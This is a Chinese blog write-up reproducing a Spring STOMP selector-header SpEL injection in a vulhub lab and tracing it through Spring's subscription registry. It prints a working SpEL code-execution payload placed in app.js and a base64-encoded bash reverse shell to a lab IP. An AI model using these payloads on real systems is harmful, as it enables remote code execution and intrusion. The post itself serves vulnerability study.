# **前言**

前两天接到朋友对某个授权目标的漏扫结果，也算是初次接触到这个漏洞，就想着顺手分析一下复现一下，因为分析这个漏洞的文章也比较少，所以刚开始比较迷，进度也比较慢。

#  **漏洞复现**

使用vulhub搭建环境，下载vulhub

> git clone <https://github.com/vulhub/vulhub.git>

spring目录下有docker镜像直接启起来。

> sudo docker-compose up -d

![image-20220310111728057.png](https://image.3001.net/images/20220402/1648884184_6247f9d8a05f0cd0d0353.png!small)

访问8080端口即可查看。

![image-20220310111549375.png](https://image.3001.net/images/20220402/1648884185_6247f9d965675a2107169.png!small)

环境搭建ok，其实这里使用构造的payload不知道为什么不可以，稍后尝试，先使用 **exp** 去执行，在环境中刚好有exp，我们只需要修改目标ip。

![image-20220310175251208.png](https://image.3001.net/images/20220402/1648884186_6247f9da08ba987e33041.png!small)

修改执行的命令，

![image-20220310175911765.png](https://image.3001.net/images/20220402/1648884186_6247f9da9562c2001ea4e.png!small)

执行EXP，

![image-20220311095516295.png](https://image.3001.net/images/20220402/1648884187_6247f9db17e91e7ae8ff7.png!small)

进入docker容器查看是否成功生成数据。

> ocker exec -it 1f699e14e /bin/bash

![image-20220311095617624.png](https://image.3001.net/images/20220402/1648884187_6247f9db9a52a6d50dc63.png!small)

验证EXP成功利用，这里尝试一下反弹shell，在另一台终端监听一个端口。

> nc -lvp 9999

修改EXP，

> bash -c
> {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMTQuMjUxLzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}

####
![image-20220311105532391.png](https://image.3001.net/images/20220402/1648884188_6247f9dc34c28df32ab10.png!small)

![image-20220311105612142.png](https://image.3001.net/images/20220402/1648884188_6247f9dcb009216ad308e.png!small)

得到容器的shell，

![image-20220311105727135.png](https://image.3001.net/images/20220402/1648884189_6247f9dd640d8ef76c6bd.png!small)

由于在线编码的平台不能使用，所以需要自己做一下base64的编码然后再解码，但是这里为什么直接反弹的shell不能够执行呢？

是因为管道符、输入输出重定向，只有在bash环境下才能用。由于项目环境为Java环境不支持管道符、输入输出重定向等。重定向和管道符的使用方式在正在启动的进程的中没有意义。例如`ls
> 1.txt`在shell中执行为将当前目录的列表输出到命名为 `1.txt`。但是在 `exec()`函数的中，该命令为解释为获取 `>`和
`1.txt`目录的列表。

下载源码

> wget <https://github.com/spring-guides/gs-messaging-stomp-websocket.git>

新建项目导入 **pom.xml** 文件搭建环境，配置配置文件。

![image-20220311152017412.png](https://image.3001.net/images/20220402/1648884190_6247f9de49b6d91581f0c.png!small)

运行本地已搭建，

![image-20220311152136724.png](https://image.3001.net/images/20220402/1648884191_6247f9df0c2b916cba0a8.png!small)

> <http://127.0.0.1:8080/>

![image-20220311152050999.png](https://image.3001.net/images/20220402/1648884191_6247f9dfb9d8afa743f5c.png!small)

本地搭建目的是方便调试。

修改代码位置，

> src->main->resources->static->app.js

修改connect方法，

    
    
    function connect() {  
    var header  = {"selector":"T(java.lang.Runtime).getRuntime().exec('calc.exe')"};  
    var socket = new SockJS('/gs-guide-websocket');  
    stompClient = Stomp.over(socket);  
    stompClient.connect({}, function (frame) {  
    setConnected(true);  
    console.log('Connected: ' + frame);  
    stompClient.subscribe('/topic/greetings', function (greeting) {  
    showGreeting(JSON.parse(greeting.body).content);  
    },header);  
    });  
    }

保存后重新运行，Websocket连接，send发送任意信息即可触发 **calc.exe。**

![image-20220311155506202.png](https://image.3001.net/images/20220402/1648884192_6247f9e08f9570eefa9bf.png!small)

#  **分析**

本地windows的触发条件更能清楚的理解，exec中代码执行的条件是由于建立socket通信之后发送信息的时候触发的，这里通过下断点来调试。

首先先了解几个概念，没有java框架开发经验的话确实很让人头疼，SpEL表达式，是Spring表达式的简写，能够以一种强大而简洁的方式将值装配到Bean属性和构造器参数中，在这个过程中所使用的表达式会在运行时计算得到值。简单理解就是利用简单的表达形式来实现操作。

SpEL支持如下表达式：

  * 基本表达式：字面量表达式、关系，逻辑与算数运算表达式、字符串连接及截取表达式、三目运算及Elivis表达式、正则表达式、括号优先级表达式；

  * 类相关表达式：类类型表达式、类实例化、instanceof表达式、变量定义及引用、赋值表达式、自定义函数、对象属性存取及安全导航表达式、对象方法调用、Bean引用；

  * 集合相关表达式：内联List、内联数组、集合，字典访问、列表，字典，数组修改、集合投影、集合选择；不支持多维内联数组初始化；不支持内联字典定义；

  * 其他表达式：模板表达式。

STOMP协议

STOMP是一个简单的可互操作的基于帧的协议,
作用于中间服务器在客户端之间进行异步消息传递，STOMP协议基于TCP协议，类似于HTTP协议，使用了以下命令：

    
    
    CONNECT  
    SEND  
    SUBSCRIBE  
    UNSUBSCRIBE  
    BEGIN  
    COMMIT  
    ABORT  
    ACK  
    NACK  
    DISCONNECT

> Ctrl+N

根据披露的漏洞位置，直接搜索问题类DefaultSubscriptionRegistry

![image-20220314165820979.png](https://image.3001.net/images/20220402/1648884193_6247f9e1d28a89cedbe59.png!small)

![image-20220314143519630.png](https://image.3001.net/images/20220402/1648884194_6247f9e27d61b1377ab6e.png!small)

在Protected属性addSubscriptionInternal方法中，定义了selectorHeaderInUse的属性为true。

![image-20220314180254754.png](https://image.3001.net/images/20220402/1648884195_6247f9e36ff9f1ec5b313.png!small)

95行的时候把四个参数，sessinId，subsId,destination(订阅地址("/topic/greetings")以及expression添加进subscriptionRegistry属性中。

app.js修改的代码位置为

> var header =
> {"selector":"T(java.lang.Runtime).getRuntime().exec('calc.exe')"};

![image-20220314175840528.png](https://image.3001.net/images/20220402/1648884196_6247f9e438ca17a5e3e35.png!small)

private属性中的filterSubscriptions方法在什么时候会触发呢？下断点调试会发现，在send发送信息的时候会传入message参数，这个时候就会调用前端传入的selector构造的内容即SpEL表达式的内容，从第二种的复现方式来看就是这样的，但是在调试的时候正常的利用是首先触发。

![image-20220315110228766.png](https://image.3001.net/images/20220402/1648884196_6247f9e4e69f3ea4fca2d.png!small)

118行调用findSubscriptionsInternal函数。

![image-20220315110446101.png](https://image.3001.net/images/20220402/1648884197_6247f9e57ae0d210350a5.png!small)

> ctrl+N向上查找函数

![image-20220315110556004.png](https://image.3001.net/images/20220402/1648884198_6247f9e63ed1d4c0be3eb.png!small)

在AbstractSubscriptionRegistry类中找到了在满足else的时候调用了findSubscriptionsInternal函数，可能在这里也许有师傅有点困惑，在这里我们需要明白的是参数destination(订阅地址)和参数message(含有SpEL表达式即payload)的内容。

但是这里有个疑问，那么哪里利用到了STOMP协议的内容呢？

上文提到了STOMP协议的命令，里面涉及到的 **SUBSCRIBE**
命令，在SUBSCRIBE命令下selector头值会作为表达式存储，在实现addSubscriptionInternal方法的方法生成sessionID的时候表达式已经实现了存储。

这个时候就很明显了，seesionid的生成就涉及到了websocket实现客户端和服务器之间的交互。

![image-20220315112137940.png](https://image.3001.net/images/20220402/1648884199_6247f9e7049cf2928ed9b.png!small)

到这里分析就结束了，但是函数调用以及漏洞触发的原因已经分析的比较清楚了。

# 小结

Java的东西忘记的差不多了，IDEA的快捷键都给忘了，突然分析起来很头大，可参考的内容也比较少，走的坑也比较多吧，有问题的地方欢迎师傅们指正。

# 参考文章

> <https://mp.weixin.qq.com/s/9ZHopkDK8aVzFPrSOEgOVg>
>
> <https://mp.weixin.qq.com/s/K56p8PkyrxmsZ1holFbh2Q>
>
> [https://www.jianshu.com/p/ae3922db1f70
> ](https://www.jianshu.com/p/ae3922db1f70)

